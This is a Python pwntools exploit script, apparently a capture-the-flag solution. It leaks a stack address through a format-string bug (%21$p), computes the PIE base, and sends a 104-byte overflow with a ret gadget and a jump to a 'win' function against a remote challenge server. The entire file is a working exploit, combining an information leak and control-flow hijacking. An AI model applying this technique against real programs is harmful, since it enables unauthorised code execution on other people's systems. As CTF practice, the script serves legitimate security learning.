from pwn import *

#%21$p

elf = context.binary = ELF("./challenge")	
libc = elf.libc

gs = '''
break *main
'''

def conn():
	if args.GDB:
		return gdb.debug(elf.path,gdbscript=gs)
	else:
		return process([elf.path])
	return r

#p = conn()
p = remote("rvcechalls.xyz",27250	)
p.recvuntil('me: ')
#0x557dbb8d9000 - 0x557dbb8da316 = 0x1316
p.sendline(b'%21$p')
p.recvuntil("Mr. ")
base = int(p.recvline().strip(),16) - 0x1316
win = base + 0x125a
ret = base + 0x1016
offset = 104
payload = b"A"* offset  + p64(ret) + p64(win)

p.recvuntil("? ")
p.sendline(payload)

p.interactive()